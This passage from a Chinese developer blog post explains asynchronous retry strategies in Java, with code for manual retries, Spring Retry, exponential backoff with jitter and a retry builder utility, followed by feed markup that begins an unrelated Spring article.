<h2 data-id="heading-6">2.异步编程中的常见错误</h2>
<h3 data-id="heading-7">2.1 网络相关错误</h3>
<ul>
<li>连接超时</li>
<li>读取超时</li>
<li>DNS 解析失败</li>
<li>网络不可达</li>
</ul>
<h3 data-id="heading-8">2.2 资源相关错误</h3>
<ul>
<li>内存不足</li>
<li>线程池耗尽</li>
<li>数据库连接超时</li>
</ul>
<h3 data-id="heading-9">2.3 业务逻辑错误</h3>
<ul>
<li>远程服务返回错误码</li>
<li>数据格式异常</li>
<li>业务规则校验失败</li>
</ul>
<h3 data-id="heading-10">2.4 示例：可能出错的异步方法</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnreliableService</span> {
    
    <span class="hljs-comment">// 模拟不可靠的远程服务调用</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">callExternalService</span><span class="hljs-params">(String data)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟随机错误</span>
            <span class="hljs-type">double</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> Math.random();
            <span class="hljs-keyword">if</span> (random &lt; <span class="hljs-number">0.3</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"网络超时"</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (random &lt; <span class="hljs-number">0.6</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"服务端错误"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"处理结果: "</span> + data;
        });
    }
}
</code></pre>
<h2 data-id="heading-11">3. 异步重试机制实现</h2>
<h3 data-id="heading-12">3.1 手动重试实现</h3>
<h4 data-id="heading-13">3.1.1 基础重试逻辑</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryAsync</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task, 
            <span class="hljs-type">int</span> maxAttempts, 
            <span class="hljs-type">long</span> delayMs)</span> {
        
        CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
        retryAsync(task, maxAttempts, delayMs, <span class="hljs-number">1</span>, result);
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">retryAsync</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task, 
            <span class="hljs-type">int</span> maxAttempts, 
            <span class="hljs-type">long</span> delayMs, 
            <span class="hljs-type">int</span> attempt, 
            CompletableFuture&lt;T&gt; result)</span> {
        
        task.get().whenComplete((response, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                result.complete(response);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attempt &gt;= maxAttempts) {
                result.completeExceptionally(throwable);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 延迟后重试</span>
                CompletableFuture.delayedExecutor(delayMs, TimeUnit.MILLISECONDS)
                    .execute(() -&gt; retryAsync(task, maxAttempts, delayMs, attempt + <span class="hljs-number">1</span>, result));
            }
        });
    }
}
</code></pre>
<h3 data-id="heading-14">3.2 使用 Spring Retry</h3>
<h4 data-id="heading-15">3.2.1 添加依赖</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.retry<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-retry<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aspects<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-16">3.2.2 配置重试模板</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableRetry</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RetryTemplate <span class="hljs-title function_">retryTemplate</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RetryTemplate</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RetryTemplate</span>();
        
        <span class="hljs-comment">// 重试策略：最多重试3次，遇到特定异常时重试</span>
        <span class="hljs-type">SimpleRetryPolicy</span> <span class="hljs-variable">retryPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRetryPolicy</span>(<span class="hljs-number">3</span>, 
            Collections.singletonMap(RuntimeException.class, <span class="hljs-literal">true</span>));
        template.setRetryPolicy(retryPolicy);
        
        <span class="hljs-comment">// 退避策略：每次重试间隔1秒</span>
        <span class="hljs-type">FixedBackOffPolicy</span> <span class="hljs-variable">backOffPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedBackOffPolicy</span>();
        backOffPolicy.setBackOffPeriod(<span class="hljs-number">1000</span>);
        template.setBackOffPolicy(backOffPolicy);
        
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<h4 data-id="heading-17">3.2.3 使用 @Retryable 注解</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryableService</span> {
    
    <span class="hljs-meta">@Retryable(
        value = {RuntimeException.class},
        maxAttempts = 3,
        backoff = @Backoff(delay = 1000)
    )</span>
    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">retryableAsyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟可能失败的操作</span>
            <span class="hljs-keyword">if</span> (Math.random() &lt; <span class="hljs-number">0.7</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"临时错误"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"成功结果"</span>;
        });
    }
    
    <span class="hljs-meta">@Recover</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">recover</span><span class="hljs-params">(RuntimeException e)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(<span class="hljs-string">"降级结果"</span>);
    }
}
</code></pre>
<h3 data-id="heading-18">3.3 高级重试策略实现</h3>
<h4 data-id="heading-19">3.3.1 指数退避重试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExponentialBackoffRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithExponentialBackoff</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            <span class="hljs-type">int</span> maxAttempts,
            <span class="hljs-type">long</span> initialDelay,
            <span class="hljs-type">long</span> maxDelay)</span> {
        
        <span class="hljs-keyword">return</span> retryWithExponentialBackoff(task, maxAttempts, initialDelay, maxDelay, <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithExponentialBackoff</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            <span class="hljs-type">int</span> maxAttempts,
            <span class="hljs-type">long</span> initialDelay,
            <span class="hljs-type">long</span> maxDelay,
            <span class="hljs-type">int</span> attempt)</span> {
        
        CompletableFuture&lt;T&gt; future = task.get();
        
        <span class="hljs-keyword">if</span> (attempt &gt;= maxAttempts) {
            <span class="hljs-keyword">return</span> future;
        }
        
        <span class="hljs-keyword">return</span> future.handle((result, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(result);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 计算退避时间</span>
                <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> Math.min(maxDelay, initialDelay * (<span class="hljs-type">long</span>) Math.pow(<span class="hljs-number">2</span>, attempt - <span class="hljs-number">1</span>));
                
                <span class="hljs-comment">// 添加随机抖动避免惊群效应</span>
                delay = (<span class="hljs-type">long</span>) (delay * (<span class="hljs-number">0.5</span> + Math.random()));
                
                CompletableFuture&lt;T&gt; nextAttempt = CompletableFuture
                    .delayedExecutor(delay, TimeUnit.MILLISECONDS)
                    .supplyAsync(() -&gt; 
                        retryWithExponentialBackoff(task, maxAttempts, initialDelay, maxDelay, attempt + <span class="hljs-number">1</span>)
                    )
                    .thenCompose(cf -&gt; cf);
                
                <span class="hljs-keyword">return</span> nextAttempt;
            }
        }).thenCompose(cf -&gt; cf);
    }
}
</code></pre>
<h4 data-id="heading-20">3.3.2 基于条件的重试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionalRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithCondition</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            Predicate&lt;Throwable&gt; shouldRetry,
            <span class="hljs-type">int</span> maxAttempts,
            Function&lt;Integer, Long&gt; delayCalculator)</span> {
        
        CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
        retryWithCondition(task, shouldRetry, maxAttempts, delayCalculator, <span class="hljs-number">1</span>, result);
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">retryWithCondition</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            Predicate&lt;Throwable&gt; shouldRetry,
            <span class="hljs-type">int</span> maxAttempts,
            Function&lt;Integer, Long&gt; delayCalculator,
            <span class="hljs-type">int</span> attempt,
            CompletableFuture&lt;T&gt; result)</span> {
        
        task.get().whenComplete((response, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                result.complete(response);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-type">boolean</span> <span class="hljs-variable">canRetry</span> <span class="hljs-operator">=</span> attempt &lt; maxAttempts &amp;&amp; shouldRetry.test(throwable);
            
            <span class="hljs-keyword">if</span> (!canRetry) {
                result.completeExceptionally(throwable);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> delayCalculator.apply(attempt);
            CompletableFuture.delayedExecutor(delay, TimeUnit.MILLISECONDS)
                .execute(() -&gt; 
                    retryWithCondition(task, shouldRetry, maxAttempts, delayCalculator, attempt + <span class="hljs-number">1</span>, result)
                );
        });
    }
}
</code></pre>
<h3 data-id="heading-21">3.4 完整的重试工具类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncRetryUtil</span> {
    
    <span class="hljs-comment">/**
     * 异步重试执行器
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncRetryBuilder</span>&lt;T&gt; {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Supplier&lt;CompletableFuture&lt;T&gt;&gt; task;
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">maxAttempts</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
        <span class="hljs-keyword">private</span> Predicate&lt;Throwable&gt; retryCondition = ex -&gt; <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">private</span> Function&lt;Integer, Long&gt; delayStrategy = attempt -&gt; <span class="hljs-number">1000L</span> * attempt;
        <span class="hljs-keyword">private</span> Consumer&lt;Integer&gt; onRetry = attempt -&gt; {};
        <span class="hljs-keyword">private</span> Function&lt;Throwable, T&gt; fallback = <span class="hljs-literal">null</span>;
        
        <span class="hljs-keyword">private</span> <span class="hljs-title function_">AsyncRetryBuilder</span><span class="hljs-params">(Supplier&lt;CompletableFuture&lt;T&gt;&gt; task)</span> {
            <span class="hljs-built_in">this</span>.task = task;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(Supplier&lt;CompletableFuture&lt;T&gt;&gt; task)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncRetryBuilder</span>&lt;&gt;(task);
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">maxAttempts</span><span class="hljs-params">(<span class="hljs-type">int</span> maxAttempts)</span> {
            <span class="hljs-built_in">this</span>.maxAttempts = maxAttempts;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">retryIf</span><span class="hljs-params">(Predicate&lt;Throwable&gt; condition)</span> {
            <span class="hljs-built_in">this</span>.retryCondition = condition;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">delayStrategy</span><span class="hljs-params">(Function&lt;Integer, Long&gt; strategy)</span> {
            <span class="hljs-built_in">this</span>.delayStrategy = strategy;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">onRetry</span><span class="hljs-params">(Consumer&lt;Integer&gt; callback)</span> {
            <span class="hljs-built_in">this</span>.onRetry = callback;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> AsyncRetryBuilder&lt;T&gt; <span class="hljs-title function_">fallback</span><span class="hljs-params">(Function&lt;Throwable, T&gt; fallback)</span> {
            <span class="hljs-built_in">this</span>.fallback = fallback;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }
        
        <span class="hljs-keyword">public</span> CompletableFuture&lt;T&gt; <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
            CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
            execute(<span class="hljs-number">1</span>, result);
            <span class="hljs-keyword">return</span> result;
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> attempt, CompletableFuture&lt;T&gt; result)</span> {
            task.get().whenComplete((response, throwable) -&gt; {
                <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                    result.complete(response);
                    <span class="hljs-keyword">return</span>;
                }
                
                <span class="hljs-type">boolean</span> <span class="hljs-variable">shouldRetry</span> <span class="hljs-operator">=</span> attempt &lt; maxAttempts &amp;&amp; retryCondition.test(throwable);
                
                <span class="hljs-keyword">if</span> (!shouldRetry) {
                    <span class="hljs-keyword">if</span> (fallback != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-type">T</span> <span class="hljs-variable">fallbackResult</span> <span class="hljs-operator">=</span> fallback.apply(throwable);
                            result.complete(fallbackResult);
                        } <span class="hljs-keyword">catch</span> (Exception e) {
                            result.completeExceptionally(e);
                        }
                    } <span class="hljs-keyword">else</span> {
                        result.completeExceptionally(throwable);
                    }
                    <span class="hljs-keyword">return</span>;
                }
                
                onRetry.accept(attempt);
                <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> delayStrategy.apply(attempt);
                
                CompletableFuture.delayedExecutor(delay, TimeUnit.MILLISECONDS)
                    .execute(() -&gt; execute(attempt + <span class="hljs-number">1</span>, result));
            });
        }
    }
}
</code></pre>
<h3 data-id="heading-22">3.5 使用示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 模拟不可靠的服务</span>
        Supplier&lt;CompletableFuture&lt;String&gt;&gt; unreliableService = () -&gt; 
            CompletableFuture.supplyAsync(() -&gt; {
                <span class="hljs-type">double</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> Math.random();
                <span class="hljs-keyword">if</span> (rand &lt; <span class="hljs-number">0.8</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"服务暂时不可用"</span>);
                }
                <span class="hljs-keyword">return</span> <span class="hljs-string">"服务调用成功"</span>;
            });
        
        <span class="hljs-comment">// 使用重试工具</span>
        CompletableFuture&lt;String&gt; result = AsyncRetryUtil.AsyncRetryBuilder
            .of(unreliableService)
            .maxAttempts(<span class="hljs-number">5</span>)
            .retryIf(ex -&gt; ex.getMessage().contains(<span class="hljs-string">"暂时不可用"</span>))
            .delayStrategy(attempt -&gt; <span class="hljs-number">1000L</span> * attempt) <span class="hljs-comment">// 线性退避</span>
            .onRetry(attempt -&gt; 
                System.out.println(<span class="hljs-string">"第 "</span> + attempt + <span class="hljs-string">" 次重试..."</span>))
            .fallback(ex -&gt; <span class="hljs-string">"降级结果"</span>)
            .execute();
        
        result.whenComplete((response, error) -&gt; {
            <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
                System.out.println(<span class="hljs-string">"最终失败: "</span> + error.getMessage());
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"最终结果: "</span> + response);
            }
        });
        
        <span class="hljs-comment">// 等待异步操作完成</span>
        Thread.sleep(<span class="hljs-number">10000</span>);
    }
}
</code></pre>
<h2 data-id="heading-23">4. 注意事项</h2>
<h3 data-id="heading-24">4.1 重试策略选择</h3>
<ul>
<li><strong>网络超时</strong>：使用指数退避 + 随机抖动</li>
<li><strong>服务限流</strong>：根据返回的等待时间重试</li>
<li><strong>业务错误</strong>：根据具体错误码决定是否重试</li>
</ul>
<h3 data-id="heading-25">4.2 避免的问题</h3>
<ol>
<li><strong>无限重试</strong>：设置最大重试次数</li>
<li><strong>资源耗尽</strong>：合理控制重试频率</li>
<li><strong>雪崩效应</strong>：使用断路器模式配合重试</li>
<li><strong>重复操作</strong>：确保操作的幂等性</li>
</ol>
<h3 data-id="heading-26">4.3 监控和日志</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 添加重试监控</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryMonitor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">MeterRegistry</span> <span class="hljs-variable">meterRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMeterRegistry</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordRetry</span><span class="hljs-params">(String operation, <span class="hljs-type">int</span> attempt)</span> {
        Counter.builder(<span class="hljs-string">"retry.attempts"</span>)
            .tag(<span class="hljs-string">"operation"</span>, operation)
            .register(meterRegistry)
            .increment();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordSuccess</span><span class="hljs-params">(String operation, <span class="hljs-type">long</span> duration)</span> {
        Timer.builder(<span class="hljs-string">"retry.duration"</span>)
            .tag(<span class="hljs-string">"operation"</span>, operation)
            .tag(<span class="hljs-string">"status"</span>, <span class="hljs-string">"success"</span>)
            .register(meterRegistry)
            .record(duration, TimeUnit.MILLISECONDS);
    }
}
</code></pre>
<p>具体业务场景选择合适的重试策略，提高系统的容错能力和稳定性。</p>
<blockquote>
<p>本文首发于公众号：程序员大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
<h4 data-id="heading-27">📌往期内容</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FUqzEppE_f8gdil6S-toBTg" target="_blank" title="https://mp.weixin.qq.com/s/UqzEppE_f8gdil6S-toBTg" ref="nofollow noopener noreferrer">写前端久了，我用 Node.js 给自己造了几个省力小工具</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FF4JkmYxUs9RAtsti6V1uhg" target="_blank" title="https://mp.weixin.qq.com/s/F4JkmYxUs9RAtsti6V1uhg" ref="nofollow noopener noreferrer">我也是写了很久 TypeScript，才意识到这些写法不对</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2wHCiqgtRfK_008fLBamPQ" target="_blank" title="https://mp.weixin.qq.com/s/2wHCiqgtRfK_008fLBamPQ" ref="nofollow noopener noreferrer">ThreadLocal 在实际项目中的 6 大用法，原来可以这么简单</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">重构了20个SpringBoot项目后，总结出这套稳定高效的架构设计</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory]]></title>    <link>https://juejin.cn/post/7594301878828498982</link>    <guid>https://juejin.cn/post/7594301878828498982</guid>    <pubDate>2026-01-13T01:23:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594301878828498982" data-draft-id="7592615536385458210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory"/> <meta itemprop="keywords" content="后端,Spring,面试"/> <meta itemprop="datePublished" content="2026-01-13T01:23:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一旅人"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一旅人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:23:40.000Z" title="Tue Jan 13 2026 01:23:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 